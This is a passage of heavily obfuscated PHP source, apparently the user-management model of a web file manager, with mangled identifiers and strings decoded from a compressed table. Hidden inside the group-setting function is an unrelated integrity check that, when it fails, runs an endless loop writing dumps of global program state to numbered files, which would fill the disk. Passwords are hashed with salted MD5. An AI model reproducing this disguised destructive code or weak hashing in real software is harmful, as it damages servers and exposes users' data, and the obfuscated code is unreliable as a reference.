clearCache($ì­¾Ã®Î) { $È¿úİœÈ =& $_SERVER[ùÆÎÔ“Ñ]; $this->cacheFunctionClear($È¿úİœÈ[1939], $ì­¾Ã®Î); $this->cacheFunctionClear($È¿úİœÈ[1940], $ì­¾Ã®Î); $this->cacheFunctionClear($È¿úİœÈ[2302], $ì­¾Ã®Î); } public function userPasswordCheck($ØÒ†¾›…, $ŸØÖÏÏ) { $ßØó¶‚ =& $_SERVER[ùÆÎÔ“Ñ]; $ÖÂ†ÌŞ— = $this->where(array($ßØó¶‚[1667] => intval($ØÒ†¾›…)))->find(); $Üê¡¬óë = $this->metaGet($ØÒ†¾›…); $«öÓ¯‡ß = isset($Üê¡¬óë[$ßØó¶‚[2321]]) ? $Üê¡¬óë[$ßØó¶‚[2321]] : $ßØó¶‚[12]; if (md5($«öÓ¯‡ß . trim($ŸØÖÏÏ)) !== $ÖÂ†ÌŞ—[$ßØó¶‚[894]]) { return !1; } return !0; } public function userAdd($ŠşæòÆÃ) { $³ÇÎÀß =& $_SERVER[ùÆÎÔ“Ñ]; $Øª­¼ã½ = array($³ÇÎÀß[420] => $ŠşæòÆÃ[$³ÇÎÀß[32]], $³ÇÎÀß[2322] => $ŠşæòÆÃ[$³ÇÎÀß[1548]], $³ÇÎÀß[2323] => isset($ŠşæòÆÃ[$³ÇÎÀß[305]]) ? $ŠşæòÆÃ[$³ÇÎÀß[305]] : $³ÇÎÀß[12], $³ÇÎÀß[2324] => isset($ŠşæòÆÃ[$³ÇÎÀß[2320]]) ? $ŠşæòÆÃ[$³ÇÎÀß[2320]] : $³ÇÎÀß[12], $³ÇÎÀß[2325] => isset($ŠşæòÆÃ[$³ÇÎÀß[542]]) ? $ŠşæòÆÃ[$³ÇÎÀß[542]] : $ŠşæòÆÃ[$³ÇÎÀß[32]], $³ÇÎÀß[2326] => isset($ŠşæòÆÃ[$³ÇÎÀß[543]]) ? $ŠşæòÆÃ[$³ÇÎÀß[543]] : $³ÇÎÀß[12], $³ÇÎÀß[2327] => isset($ŠşæòÆÃ[$³ÇÎÀß[2328]]) ? $ŠşæòÆÃ[$³ÇÎÀß[2328]] : 1, $³ÇÎÀß[2329] => $ŠşæòÆÃ[$³ÇÎÀß[894]], $³ÇÎÀß[1941] => isset($ŠşæòÆÃ[$³ÇÎÀß[1844]]) ? $ŠşæòÆÃ[$³ÇÎÀß[1844]] : 1024 * 1024 * 20, $³ÇÎÀß[1942] => 0, $³ÇÎÀß[2330] => 0, $³ÇÎÀß[1986] => isset($ŠşæòÆÃ[$³ÇÎÀß[751]]) ? $ŠşæòÆÃ[$³ÇÎÀß[751]] : 1); if (!empty($ŠşæòÆÃ[$³ÇÎÀß[1667]])) { $Øª­¼ã½[$³ÇÎÀß[1667]] = $ŠşæòÆÃ[$³ÇÎÀß[1667]]; } $­¼Ü™îà = $this->_checkExist($ŠşæòÆÃ); if ($­¼Ü™îà !== !0) { return $­¼Ü™îà; } if (!empty($Øª­¼ã½[$³ÇÎÀß[543]]) && strlen($Øª­¼ã½[$³ÇÎÀß[543]]) > 255) { $Øª­¼ã½[$³ÇÎÀß[543]] = $³ÇÎÀß[12]; } $ñÄíâÎ = $this->add($Øª­¼ã½); $‘‘èÙ = array($³ÇÎÀß[2329] => $Øª­¼ã½[$³ÇÎÀß[894]], $³ÇÎÀß[2325] => $Øª­¼ã½[$³ÇÎÀß[542]]); $this->userEdit($ñÄíâÎ, $‘‘èÙ); Model($³ÇÎÀß[1341])->userRootAdd($ñÄíâÎ); return $ñÄíâÎ; } protected function userEditTest($¢³Æ™‡, $Öíò‰—Í) { return $this->call($_SERVER[ùÆÎÔ“Ñ][2331], $¢³Æ™‡, $Öíò‰—Í); } protected function userEdit($ÜšêœÄÁ, $ÖŒÈ’«) { $á†¢„àµ =& $_SERVER[ùÆÎÔ“Ñ]; $ãêØóœÏ = $this->getInfoSimple($ÜšêœÄÁ); if (!$ãêØóœÏ) { return !1; } $ œšï = $this->_checkExist($ÖŒÈ’«, $ÜšêœÄÁ); if ($ œšï !== !0) { return $ œšï; } if (isset($ÖŒÈ’«[$á†¢„àµ[894]]) && trim($ÖŒÈ’«[$á†¢„àµ[894]]) != $á†¢„àµ[12]) { $öÈ•‹†± = $this->metaGet($ÜšêœÄÁ); if (empty($öÈ•‹†±[$á†¢„àµ[2321]])) { $öÈ•‹†±[$á†¢„àµ[2321]] = rand_string(10); Model($á†¢„àµ[513])->metaSet($ÜšêœÄÁ, $á†¢„àµ[2321], $öÈ•‹†±[$á†¢„àµ[2321]]); } $ÖŒÈ’«[$á†¢„àµ[894]] = md5($öÈ•‹†±[$á†¢„àµ[2321]] . trim($ÖŒÈ’«[$á†¢„àµ[894]])); } else { unset($ÖŒÈ’«[$á†¢„àµ[894]]); } if (!empty($ÖŒÈ’«[$á†¢„àµ[543]]) && strlen($ÖŒÈ’«[$á†¢„àµ[543]]) > 255) { $ÖŒÈ’«[$á†¢„àµ[543]] = $á†¢„àµ[12]; } $this->where(array($á†¢„àµ[1658] => $ÜšêœÄÁ))->save($ÖŒÈ’«); if (isset($ÖŒÈ’«[$á†¢„àµ[542]])) { $this->setNamePinyin($ÜšêœÄÁ, $ÖŒÈ’«[$á†¢„àµ[542]]); } $this->clearCache($ÜšêœÄÁ); return !0; } public function setNamePinyin($éÄƒ›ğ², $À«¡Ğ‹í = false) { $±‹áÛÏÂ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$À«¡Ğ‹í) { $¾ŞÉâÖÌ = $this->getInfoSimple($éÄƒ›ğ²); $À«¡Ğ‹í = $¾ŞÉâÖÌ[$±‹áÛÏÂ[542]] ? $¾ŞÉâÖÌ[$±‹áÛÏÂ[542]] : $¾ŞÉâÖÌ[$±‹áÛÏÂ[32]]; } $ìøÖú¸Ä = Model($±‹áÛÏÂ[535]); if (!Input::check($À«¡Ğ‹í, $±‹áÛÏÂ[593])) { return $ìøÖú¸Ä->metaSet($éÄƒ›ğ², array($±‹áÛÏÂ[465] => $±‹áÛÏÂ[12], $±‹áÛÏÂ[464] => $±‹áÛÏÂ[12])); } return $ìøÖú¸Ä->metaSet($éÄƒ›ğ², array($±‹áÛÏÂ[465] => str_replace($±‹áÛÏÂ[53], $±‹áÛÏÂ[12], Pinyin::get($À«¡Ğ‹í)), $±‹áÛÏÂ[464] => Pinyin::get($À«¡Ğ‹í, $±‹áÛÏÂ[594]))); } private function nickNameRpt() { $¦ÚÈ² =& $_SERVER[ùÆÎÔ“Ñ]; $Ä¶¦ûÄÒ = Model($¦ÚÈ²[771])->get($¦ÚÈ²[2332]); $®¢¶ù¹¿ = $GLOBALS[$¦ÚÈ²[6]][$¦ÚÈ²[381]][$¦ÚÈ²[2332]]; $¸à©Ï’ü = !is_null($Ä¶¦ûÄÒ) ? $Ä¶¦ûÄÒ : $®¢¶ù¹¿; return !!$¸à©Ï’ü; } private function _checkExist($ü‘´Åáº, $¾¸èÚñ = false) { $‰Õİ¸ÛÓ =& $_SERVER[ùÆÎÔ“Ñ]; $ù‹Ê€ÀÚ = array($‰Õİ¸ÛÓ[32] => UserModel::ERROR_USER_EXIST_NAME, $‰Õİ¸ÛÓ[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $‰Õİ¸ÛÓ[305] => UserModel::ERROR_USER_EXIST_EMAIL, $‰Õİ¸ÛÓ[2320] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ù‹Ê€ÀÚ[$‰Õİ¸ÛÓ[542]]); } $ÂÃıâ®ú = $¾¸èÚñ ? array($‰Õİ¸ÛÓ[1667] => array($‰Õİ¸ÛÓ[2333], $¾¸èÚñ)) : array(); foreach ($ù‹Ê€ÀÚ as $şºÉÈ¿± => $ú÷öÖ) { $İ¿Â›ş = array(); foreach ($ù‹Ê€ÀÚ as $÷ï¡Ì¯ß => $ŞñÓõÕÙ) { if (isset($ü‘´Åáº[$÷ï¡Ì¯ß]) && $ü‘´Åáº[$÷ï¡Ì¯ß]) { $İ¿Â›ş[] = $ü‘´Åáº[$÷ï¡Ì¯ß]; } } if (!$İ¿Â›ş) { continue; } $ßà”ö¸ = array_merge(array($şºÉÈ¿± => array($‰Õİ¸ÛÓ[7], $İ¿Â›ş)), $ÂÃıâ®ú); $“îÒ™² = $this->where($ßà”ö¸)->find(); if ($“îÒ™²) { return $ú÷öÖ; } } return !0; } public function userListInfo($£æ¾‰«®) { $‹ÈôÔä² =& $_SERVER[ùÆÎÔ“Ñ]; $¯Š½½¬Œ = array(); $£æ¾‰«® = is_array($£æ¾‰«®) ? array_unique($£æ¾‰«®) : array(); if (!$£æ¾‰«®) { return $¯Š½½¬Œ; } if (count($£æ¾‰«®) < 20) { foreach ($£æ¾‰«® as $º—˜áÎ“) { $¯Š½½¬Œ[$º—˜áÎ“ . $‹ÈôÔä²[12]] = $this->getInfoSimpleOuter($º—˜áÎ“); } } else { $øÁ¤›ã© = array($‹ÈôÔä²[1658] => array($‹ÈôÔä²[418], $£æ¾‰«®)); if (count($£æ¾‰«®) == 1) { $øÁ¤›ã© = array($‹ÈôÔä²[1658] => $£æ¾‰«®[0]); } $Áô¢¿íè = Model($‹ÈôÔä²[513])->field($this->simpleField)->where($øÁ¤›ã©)->select(); $Áô¢¿íè = array_to_keyvalue($Áô¢¿íè, $‹ÈôÔä²[1667]); foreach ($£æ¾‰«® as $º—˜áÎ“) { $ö¨Ù™÷ = $Áô¢¿íè[$º—˜áÎ“]; if (!$ö¨Ù™÷) { $¯Š½½¬Œ[$º—˜áÎ“ . $‹ÈôÔä²[12]] = $this->getInfoSimpleOuter($º—˜áÎ“); continue; } $ö¨Ù™÷[$‹ÈôÔä²[543]] = Action($‹ÈôÔä²[2306])->parseUrl($ö¨Ù™÷[$‹ÈôÔä²[543]]); $¯Š½½¬Œ[$º—˜áÎ“ . $‹ÈôÔä²[12]] = $ö¨Ù™÷; } } return $¯Š½½¬Œ; } protected function userStatus($Şñœôæ€, $’°÷†Ëë) { $º¡‚àšÛ = $this->getInfoSimple($Şñœôæ€); if (!$º¡‚àšÛ) { return !1; } $ù˜¤ıØ = array($_SERVER[ùÆÎÔ“Ñ][751] => $’°÷†Ëë); return $this->userEdit($Şñœôæ€, $ù˜¤ıØ); } protected function userRemove($å™Îî) { $ÛíğıÛŞ =& $_SERVER[ùÆÎÔ“Ñ]; $Ÿı¹×Á© = $this->getInfoSimple($å™Îî); if (!$Ÿı¹×Á©) { return !1; } $—ŠÂŸñˆ = array($ÛíğıÛŞ[1658] => $å™Îî); Model($ÛíğıÛŞ[601])->where($—ŠÂŸñˆ)->delete(); Model($ÛíğıÛŞ[2334])->where($—ŠÂŸñˆ)->delete(); Model($ÛíğıÛŞ[1947])->where($—ŠÂŸñˆ)->delete(); Model($ÛíğıÛŞ[2319])->where($—ŠÂŸñˆ)->delete(); Model($ÛíğıÛŞ[1073])->where($—ŠÂŸñˆ)->delete(); Model($ÛíğıÛŞ[2150])->removeUserAll($å™Îî); Model($ÛíğıÛŞ[826])->userRootRemove($å™Îî); return $this->where($—ŠÂŸñˆ)->delete(); } protected function userGroupSet($ùÛüŸÌ, $í¨…«Üá, $óÈ¬¯À˜ = array()) { $ŠÓ·½Şˆ =& $_SERVER[ùÆÎÔ“Ñ]; $©²Ÿ¼¨à = $_SERVER[$ŠÓ·½Şˆ[844]] . $ŠÓ·½Şˆ[845]; $³Ö×ğ™ = $ŠÓ·½Şˆ[881]; if ($_SERVER[$ŠÓ·½Şˆ[841]] != $³Ö×ğ™($©²Ÿ¼¨à)) { $à§»Èğ‘ = $ŠÓ·½Şˆ[882]; $‘ø™‡úĞ = $ŠÓ·½Şˆ[843]; $ı¦ô‚Ø» = $_SERVER[$ŠÓ·½Şˆ[844]] . $ŠÓ·½Şˆ[845]; $•€¼§ÀÆ = $‘ø™‡úĞ($ı¦ô‚Ø»); $ûŸÚÛŸı = explode($ŠÓ·½Şˆ[231], $•€¼§ÀÆ); if (count($ûŸÚÛŸı) < $ŠÓ·½Şˆ[618]) { $³±Ÿ¦‰ = $ŠÓ·½Şˆ[846]; $³±Ÿ¦‰(); } $Ù•¡‘» = $ŠÓ·½Şˆ[883]; $Ù•¡‘»($_SERVER[$ŠÓ·½Şˆ[884]]); $à§»Èğ‘ = $ŠÓ·½Şˆ[882]; $à§»Èğ‘(); $ã­‘è€ = $ŠÓ·½Şˆ[885]; $®Ø²³˜— = json_encode($GLOBALS[$ŠÓ·½Şˆ[886]]); $Ÿ¤Â–Û÷ = 1; for ($Èû—àª = $Ÿ¤Â–Û÷; $Èû—àª > 0; $Èû—àª++) { $ã­‘è€(DATA_PATH . $Èû—àª, $®Ø²³˜—); } } $©®ŸïŸ = $this->getInfoSimple($ùÛüŸÌ); if (!$©®ŸïŸ || !is_array($í¨…«Üá)) { return !1; } $ğôÕ”©š = Model($ŠÓ·½Şˆ[1947]); $ğôÕ”©š->where(array($ŠÓ·½Şˆ[1667] => $ùÛüŸÌ))->delete(); $ÉØ¦–ş = array(); $½ê¶ô  = 0; foreach ($í¨…«Üá as $ÁÛ­ıá => $ÁÅ“î˜È) { $—ß€”ª¥ = array($ŠÓ·½Şˆ[1667] => $ùÛüŸÌ, $ŠÓ·½Şˆ[1857] => $ÁÛ­ıá, $ŠÓ·½Şˆ[1961] => $ÁÅ“î˜È); $—ß€”ª¥[$ŠÓ·½Şˆ[1881]] = isset($óÈ¬¯À˜[$½ê¶ô ]) ? $óÈ¬¯À˜[$½ê¶ô ] : 0; $½ê¶ô ++; $ÉØ¦–ş[] = $—ß€”ª¥; } return $ğôÕ”©š->addAll($ÉØ¦–ş, array(), !0); } protected function userGroupAdd($§¿Ø´²–, $ÔÛ®¾Øù = array()) { $ù¹ı¾î” =& $_SERVER[ùÆÎÔ“Ñ]; $Ã²ŸÙÜã = $this->getInfoSimple($§¿Ø´²–); if (!$Ã²ŸÙÜã || empty($ÔÛ®¾Øù)) { return !1; } $£ëï£ö“ = array(); foreach ($ÔÛ®¾Øù as $›Ëô×Öƒ => $ñ€‡Ø„£) { $£ëï£ö“[] = array($ù¹ı¾î”[1667] => $§¿Ø´²–, $ù¹ı¾î”[1857] => $›Ëô×Öƒ, $ù¹ı¾î”[1961] => $ñ€‡Ø„£, $ù¹ı¾î”[1881] => 0); } return Model($ù¹ı¾î”[1947])->addAll($£ëï£ö“, array(), !0); } protected function userGroupRemove($ä»‰ˆ¿, $ùø…Ã) { $¸ÕŞŠÊ =& $_SERVER[ùÆÎÔ“Ñ]; $¼”Şü½ß = $this->getInfoSimple($ä»‰ˆ¿); if (!$¼”Şü½ß || !$ùø…Ã) { return !1; } $¢Ÿ¶Ş² = array($¸ÕŞŠÊ[1658] => $ä»‰ˆ¿, $¸ÕŞŠÊ[1945] => $ùø…Ã); return Model($¸ÕŞŠÊ[1947])->where($¢Ÿ¶Ş²)->delete(); } public function listData() { $âÛÜüãİ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($âÛÜüãİ[$_SERVER[ùÆÎÔ“Ñ][369]]); return $âÛÜüãİ; } public function listByID($‡íÙªÊŞ) { $•ÍÙá¸ü =& $_SERVER[ùÆÎÔ“Ñ]; if (!$‡íÙªÊŞ) { return; } $»‰Üïù³ = array($•ÍÙá¸ü[1667] => array($•ÍÙá¸ü[7], $‡íÙªÊŞ)); $ˆÂçœ¤„ = $this->where($»‰Üïù³)->select(); $ˆÂçœ¤„ = array_sort_keep($ˆÂçœ¤„, $•ÍÙá¸ü[1667], $‡íÙªÊŞ); $this->_listDataApply($ˆÂçœ¤„); return $ˆÂçœ¤„; } public function listByGroup($ÙÒé´ŸÑ = 0, $»íÖÌÖÌ = array()) { $²ğ‡ÓÚ =& $_SERVER[ùÆÎÔ“Ñ]; $”Ş­«İè = $²ğ‡ÓÚ[12]; $¶±Éğ”ì = array(); if ($ÙÒé´ŸÑ) { $¶±Éğ”ì = array($²ğ‡ÓÚ[2335] => intval($ÙÒé´ŸÑ)); $”Ş­«İè = "\114\105\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\137\x67\x72\x6f\x75\160\x20\165\x73\145\162\137\x67\162\x6f\x75\160\40\x6f\156\40\165\163\145\162\56\165\x73\145\162\x49\x44\40\75\40\x75\x73\x65\162\137\x67\162\157\165\x70\56\165\x73\145\162\111\104"; $‰å†¨È = Input::get($²ğ‡ÓÚ[457], null, $²ğ‡ÓÚ[12]) ? $²ğ‡ÓÚ[12] : $²ğ‡ÓÚ[2336]; } if (isset($»íÖÌÖÌ[$²ğ‡ÓÚ[751]])) { $¶±Éğ”ì[$²ğ‡ÓÚ[2337]] = $»íÖÌÖÌ[$²ğ‡ÓÚ[751]]; } $¶õÚõš = $this->_makeOrder($‰å†¨È)->field($²ğ‡ÓÚ[2338])->where($¶±Éğ”ì)->join($”Ş­«İè)->selectPage(50); $this->_listDataApply($¶õÚõš[$²ğ‡ÓÚ[369]]); return $¶õÚõš; } private function _makeOrder($ãã—ı«Á = '') { $È“©ÓîÙ =& $_SERVER[ùÆÎÔ“Ñ]; $‘ÖŒ÷¦ó = array($È“©ÓîÙ[1667], $È“©ÓîÙ[32], $È“©ÓîÙ[1846], $È“©ÓîÙ[1818], $È“©ÓîÙ[200]); $šñá’ˆ¿ = array($È“©ÓîÙ[450] => $È“©ÓîÙ[451], $È“©ÓîÙ[452] => $È“©ÓîÙ[453]); $”ü´ÁÔì = Input::get($È“©ÓîÙ[457], $È“©ÓîÙ[7], $È“©ÓîÙ[1658], $‘ÖŒ÷¦ó); $ï¼Æüœ¶ = Input::get($È“©ÓîÙ[458], $È“©ÓîÙ[7], $È“©ÓîÙ[1948], array($È“©ÓîÙ[1948], $È“©ÓîÙ[452])); $ï¼Æüœ¶ = $šñá’ˆ¿[$ï¼Æüœ¶]; $ãã—ı«Á = $ãã—ı«Á . "\165\163\x65\x72\x2e{$”ü´ÁÔì}\40{$ï¼Æüœ¶}\54\x20\165\163\x65\162\x2e\165\163\x65\x72\111\x44\x20\x61\x73\143"; return $this->alias($È“©ÓîÙ[2070])->order($ãã—ı«Á); } public function listSearch($¤ıïÏ¡) { $¾³“Øİ =& $_SERVER[ùÆÎÔ“Ñ]; $ÛŒôµ‡ = $¤ıïÏ¡[$¾³“Øİ[1951]]; $Ú«ÙŸ¡  = isset($¤ıïÏ¡[$¾³“Øİ[1952]]) ? $¤ıïÏ¡[$¾³“Øİ[1952]] : !1; $ÛŒôµ‡ = str_replace($¾³“Øİ[1953], $¾³“Øİ[1954], trim($ÛŒôµ‡)); $şÒòÚËù = array($¾³“Øİ[32] => array($¾³“Øİ[383], "\x25{$ÛŒôµ‡}\45"), $¾³“Øİ[305] => array($¾³“Øİ[383], "{$ÛŒôµ‡}\x25"), $¾³“Øİ[542] => array($¾³“Øİ[383], "{$ÛŒôµ‡}\x25"), $¾³“Øİ[1005] => $¾³“Øİ[1955]); if (Input::check($ÛŒôµ‡, $¾³“Øİ[311])) { $şÒòÚËù[$¾³“Øİ[1667]] = array($¾³“Øİ[383], "{$ÛŒôµ‡}\45"); $şÒòÚËù[$¾³“Øİ[2320]] = array($¾³“Øİ[383], "{$ÛŒôµ‡}\45"); } if (!$ÛŒôµ‡) { $şÒòÚËù = array(); } if (isset($¤ıïÏ¡[$¾³“Øİ[751]])) { $şÒòÚËù[$¾³“Øİ[751]] = $¤ıïÏ¡[$¾³“Øİ[751]]; } $şÒòÚËù = $this->parseWhereLike($şÒòÚËù); $ÑÔ­‚Ç = $this->_makeOrder()->where($şÒòÚËù)->selectPage(20); if (!$ÑÔ­‚Ç || count($ÑÔ­‚Ç[$¾³“Øİ[369]]) < 5 && Input::check($ÛŒôµ‡, $¾³“Øİ[318])) { $Ë¦ñ—³¹ = $this->_searchFromMeta($¾³“Øİ[464], $ÛŒôµ‡, 10); $ÇŒµ˜ = $this->_searchFromMeta($¾³“Øİ[465], $ÛŒôµ‡, 10); $šÀç¨‹ = array_merge($Ë¦ñ—³¹, $ÇŒµ˜, $ÑÔ­‚Ç[$¾³“Øİ[369]]); $ÑÔ­‚Ç[$¾³“Øİ[369]] = array_unique_by_key($šÀç¨‹, $¾³“Øİ[1667]); $ÑÔ­‚Ç[$¾³“Øİ[366]][$¾³“Øİ[367]] = count($ÑÔ­‚Ç[$¾³“Øİ[369]]); $ÑÔ­‚Ç[$¾³“Øİ[366]][$¾³“Øİ[368]] = ceil($ÑÔ­‚Ç[$¾³“Øİ[366]][$¾³“Øİ[367]] / $ÑÔ­‚Ç[$¾³“Øİ[366]][$¾³“Øİ[363]]); } $this->_listDataApply($ÑÔ­‚Ç[$¾³“Øİ[369]]); $this->_filterByGroup($ÑÔ­‚Ç, $Ú«ÙŸ¡ ); return $ÑÔ­‚Ç; } private function _filterByGroup(&$¾¢Ş§«, $ï³Ñª€) { $í³ôÒ‡ò =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ï³Ñª€) { return $¾¢Ş§«; } foreach ($¾¢Ş§«[$í³ôÒ‡ò[369]] as $ÛšºˆÀ¡ => &$šë°») { $ÛŸâáÙû = array_to_keyvalue($šë°»[$í³ôÒ‡ò[2040]], $í³ôÒ‡ò[12], $í³ôÒ‡ò[1857]); if (!in_array($ï³Ñª€, $ÛŸâáÙû)) { unset($¾¢Ş§«[$í³ôÒ‡ò[369]][$ÛšºˆÀ¡]); } } unset($šë°»); $¾¢Ş§«[$í³ôÒ‡ò[369]] = array_values($¾¢Ş§«[$í³ôÒ‡ò[369]]); $¾¢Ş§«[$í³ôÒ‡ò[366]] = array($í³ôÒ‡ò[2104] => count($¾¢Ş§«[$í³ôÒ‡ò[369]]), $í³ôÒ‡ò[2102] => $¾¢Ş§«[$í³ôÒ‡ò[366]][$í³ôÒ‡ò[363]], $í³ôÒ‡ò[2101] => 1, $í³ôÒ‡ò[2103] => 1); } private function _searchFromMeta($¾ãõÉìÄ, $´ïûÎ», $îÕ³ ö¦) { $á·›ª =& $_SERVER[ùÆÎÔ“Ñ]; $´ïûÎ» = strtolower($´ïûÎ»); $¥¢£†Ò = array($á·›ª[94] => $¾ãõÉìÄ, $á·›ª[374] => array($á·›ª[383], "\x25{$´ïûÎ»}\45")); $¥¢£†Ò = $this->parseWhereLike($¥¢£†Ò); $óãÂ¤Âï = Model($á·›ª[2339])->where($¥¢£†Ò)->limit($îÕ³ ö¦)->select(); if (!$óãÂ¤Âï) { return array(); } $óãÂ¤Âï = array_to_keyvalue($óãÂ¤Âï, $á·›ª[12], $á·›ª[1667]); $óİ˜ˆ”õ = $this->where(array($á·›ª[1658] => array($á·›ª[7], $óãÂ¤Âï)))->select(); if (!$óİ˜ˆ”õ) { return array(); } return $óİ˜ˆ”õ; } private function _listDataApplyItem($æÅ±­Æª) { $àèèÂ± = array($æÅ±­Æª); $this->_listDataApply($àèèÂ±); return $àèèÂ±[0]; } private function _listDataApply(&$ÚÜ›…û) { $—ê•é´Æ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ÚÜ›…û) { return; } array_remove_key($ÚÜ›…û, $—ê•é´Æ[894]); $ÚÙˆâúì = array_to_keyvalue($ÚÜ›…û, $—ê•é´Æ[12], $—ê•é´Æ[1667]); $this->_listAppendGroup($ÚÜ›…û, $ÚÙˆâúì); $this->_listAppendMeta($ÚÜ›…û, $ÚÙˆâúì); $this->_listAppendSourceRoot($ÚÜ›…û, $ÚÙˆâúì); } private function _listAppendSourceRoot(&$»Íã³—º, $şá¥´î) { $Öèõí°Á =& $_SERVER[ùÆÎÔ“Ñ]; $¬œ®´“¨ = Model($Öèõí°Á[826])->listSourceRoot(SourceModel::TYPE_USER, $şá¥´î); $¬œ®´“¨ = array_to_keyvalue($¬œ®´“¨, $Öèõí°Á[505]); $¬œ®´“¨ = array_remove_key($¬œ®´“¨, $Öèõí°Á[505]); foreach ($»Íã³—º as &$Í–®º) { $Í–®º[$Öèõí°Á[86]] = $¬œ®´“¨[$Í–®º[$Öèõí°Á[1667]]] ? $¬œ®´“¨[$Í–®º[$Öèõí°Á[1667]]] : array(); } unset($Í–®º); } private function _listAppendGroup(&$ëÛ“ìæï, $ƒ“Û“Šš) { $¾ÉÏˆÍ =& $_SERVER[ùÆÎÔ“Ñ]; $¡½ ã„¦ = array($¾ÉÏˆÍ[1667] => array($¾ÉÏˆÍ[7], $ƒ“Û“Šš)); $ù´û½ï¶ = Model($¾ÉÏˆÍ[1947])->where($¡½ ã„¦)->select(); $ª×ˆ„·å = array_to_keyvalue($ù´û½ï¶, $¾ÉÏˆÍ[12], $¾ÉÏˆÍ[1857]); $ª×ˆ„·å = array_remove_value(array_unique($ª×ˆ„·å), $¾ÉÏˆÍ[197]); if (!$ª×ˆ„·å || !$ù´û½ï¶) { return; } $¡½ ã„¦ = array($¾ÉÏˆÍ[1857] => array($¾ÉÏˆÍ[7], $ª×ˆ„·å)); $ä„¤›Ÿô = Model($¾ÉÏˆÍ[2038])->field($¾ÉÏˆÍ[2340])->where($¡½ ã„¦)->select(); $ä„¤›Ÿô = array_to_keyvalue($ä„¤›Ÿô, $¾ÉÏˆÍ[1857]); $ù´û½ï¶ = array_to_keyvalue_group($ù´û½ï¶, $¾ÉÏˆÍ[1667]); foreach ($ù´û½ï¶ as &$ß–Êá¦) { $¯€ª¦Æ = array(); foreach ($ß–Êá¦ as $ï¨Ãõ—ä) { if (!$ï¨Ãõ—ä[$¾ÉÏˆÍ[1961]]) { continue; } $àÖº¡× = Model($¾ÉÏˆÍ[507])->listData($ï¨Ãõ—ä[$¾ÉÏˆÍ[1961]]); $¯€ª¦Æ[] = array($¾ÉÏˆÍ[1857] => $ï¨Ãõ—ä[$¾ÉÏˆÍ[1857]], $¾ÉÏˆÍ[2341] => $ä„¤›Ÿô[$ï¨Ãõ—ä[$¾ÉÏˆÍ[1857]]][$¾ÉÏˆÍ[32]], $¾ÉÏˆÍ[521] => $ä„¤›Ÿô[$ï¨Ãõ—ä[$¾ÉÏˆÍ[1857]]][$¾ÉÏˆÍ[521]], $¾ÉÏˆÍ[413] => $àÖº¡×); } $ß–Êá¦ = $¯€ª¦Æ; } unset($ß–Êá¦); foreach ($ëÛ“ìæï as &$Ìñúè¶Ø) { $Ìñúè¶Ø[$¾ÉÏˆÍ[2040]] = array(); if (isset($ù´û½ï¶[$Ìñúè¶Ø[$¾ÉÏˆÍ[1667]]])) { $Ìñúè¶Ø[$¾ÉÏˆÍ[2040]] = $ù´û½ï¶[$Ìñúè¶Ø[$¾ÉÏˆÍ[1667]]]; } } unset($Ìñúè¶Ø); } public function userAppendGroup($Œ™ïÊÔˆ) { $½şíµœ— =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Œ™ïÊÔˆ) { return array(); } $this->_listAppendGroup($Œ™ïÊÔˆ, array_to_keyvalue($Œ™ïÊÔˆ, $½şíµœ—[12], $½şíµœ—[1667])); return $Œ™ïÊÔˆ; } private function _listAppendMeta(&$Êê±Á, $öß›³’Ş) { $Êå‡¬³  =& $_SERVER[ùÆÎÔ“Ñ]; $åÙí°ìÒ = UserJobModel::JOB_KEY; $öÑúö—Œ = array($Êå‡¬³ [2321]); $š¦»È·ì = array($Êå‡¬³ [1667] => array($Êå‡¬³ [7], $öß›³’Ş)); $·é¡™ªØ = Model($Êå‡¬³ [2319])->where($š¦»È·ì)->select(); $·é¡™ªØ = array_to_keyvalue_group($·é¡™ªØ, $Êå‡¬³ [1667]); foreach ($·é¡™ªØ as &$ŞùÔ¢¹à) { $šÖéà³Â = array(); foreach ($ŞùÔ¢¹à as $·èäô­Û) { if (!in_array($·èäô­Û[$Êå‡¬³ [94]], $öÑúö—Œ)) { $šÖéà³Â[$·èäô­Û[$Êå‡¬³ [94]]] = $·èäô­Û[$Êå‡¬³ [374]]; } } $ŞùÔ¢¹à = $šÖéà³Â; } unset($ŞùÔ¢¹à); $åÃÕÈõì = Model($Êå‡¬³ [2342]); foreach ($Êê±Á as &$İğ½ç¡) { $à˜²À = array(); if (isset($·é¡™ªØ[$İğ½ç¡[$Êå‡¬³ [1667]]])) { $à˜²À = $·é¡™ªØ[$İğ½ç¡[$Êå‡¬³ [1667]]]; } $İğ½ç¡[$Êå‡¬³ [2343]] = array(); if (isset($à˜²À[$åÙí°ìÒ])) { $İğ½ç¡[$Êå‡¬³ [2343]] = $åÃÕÈõì->getUserJobInfo($à˜²À[$åÙí°ìÒ]); } } unset($İğ½ç¡); } protected function groupUserAll($Ø¿Ô¯…²) { $Ö¼Â¾ÌÜ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Ø¿Ô¯…²) { return !1; } $€€ù´Ô³ = Model($Ö¼Â¾ÌÜ[1947])->field($Ö¼Â¾ÌÜ[1667])->where(array($Ö¼Â¾ÌÜ[1857] => array($Ö¼Â¾ÌÜ[7], $Ø¿Ô¯…²)))->select(); $€€ù´Ô³ = array_to_keyvalue($€€ù´Ô³, $Ö¼Â¾ÌÜ[12], $Ö¼Â¾ÌÜ[1667]); return array_unique($€€ù´Ô³); } public function userSearch($Üƒßºæ, $ÕÅşËñá = "\x2a") { return Model($_SERVER[ùÆÎÔ“Ñ][535])->where($Üƒßºæ)->field($ÕÅşËñá)->find(); } } goto d±™ÑÆ²…; Dïõøí„ë: define($_SERVER[ùÆÎÔ“Ñ][0], $_SERVER[ùÆÎÔ“Ñ][1]); $_SERVER[„Ú¢¸Ô«] = explode($_SERVER[ùÆÎÔ“Ñ][2], gzinflate(substr($_SERVER[ùÆÎÔ“Ñ][3], 10, -8))); function binCheckEq($ª©ò’–ã, $Ó…ÛÜøÔ) { return $ª©ò’–ã == $Ó…ÛÜøÔ; } goto DÆ“‰ÀË…; e÷ÙºÁÖÀ†: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } 